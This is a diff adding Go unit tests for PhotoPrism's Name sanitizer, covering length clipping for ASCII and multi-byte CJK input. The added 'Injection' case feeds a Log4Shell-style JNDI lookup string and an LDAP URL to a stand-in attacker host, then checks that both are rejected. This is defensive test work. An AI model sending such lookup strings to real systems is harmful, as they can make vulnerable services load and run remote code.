@@ -1,9 +1,12 @@
 package clean
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
+
+	"github.com/photoprism/photoprism/pkg/txt"
 )
 
 func TestName(t *testing.T) {
@@ -33,6 +36,24 @@ func TestName(t *testing.T) {
 	})
 	t.Run("Space", func(t *testing.T) {
 		assert.Equal(t, "", Name("        "))
+	})
+	t.Run("LongName", func(t *testing.T) {
+		got := Name(strings.Repeat("a", txt.ClipDefault+50))
+		assert.Equal(t, txt.ClipDefault, len(got))
+		assert.Equal(t, strings.Repeat("a", txt.ClipDefault), got)
+	})
+	t.Run("LongMultiByte", func(t *testing.T) {
+		// CJK characters are 3 bytes each in UTF-8. The output is capped
+		// by rune count (so it fits a character-counted VARCHAR(160));
+		// callers that need a byte cap must clip on their own side.
+		got := Name(strings.Repeat("陈", txt.ClipDefault+50))
+		assert.Equal(t, txt.ClipDefault, len([]rune(got)))
+		// Result is valid UTF-8 (no broken trailing rune).
+		assert.Equal(t, got, string([]rune(got)))
+	})
+	t.Run("Injection", func(t *testing.T) {
+		assert.Equal(t, "", Name("hello ${jndi:ldap://example.com/x}"))
+		assert.Equal(t, "", Name("ldap://attacker.example/"))
 	})
 }
 
